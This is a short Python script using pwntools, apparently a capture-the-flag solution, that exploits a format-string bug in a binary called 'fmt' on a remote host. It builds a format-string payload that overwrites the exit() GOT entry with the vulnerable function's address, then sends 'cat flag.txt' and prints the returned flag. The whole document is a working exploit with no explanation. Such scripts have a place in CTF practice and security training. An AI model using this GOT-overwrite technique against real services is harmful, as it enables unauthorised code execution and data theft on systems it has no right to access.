from pwn import *

context.bits = 64

e = ELF('./fmt')
# Local Test
# r = process('./fmt')
r = remote('122.38.251.9', 30012)

READ_SIZE = 0x100
VULN_ADDR = e.symbols['vuln']
EXIT_GOT = e.got['exit']

PAYLOAD = fmtstr_payload(6, {EXIT_GOT : VULN_ADDR})

r.sendline(PAYLOAD)
r.sendline(b'cat flag.txt')

r.recvuntil(b'`')
FLAG = r.recvuntil(b'}').decode('utf-8')

print('\n'+FLAG)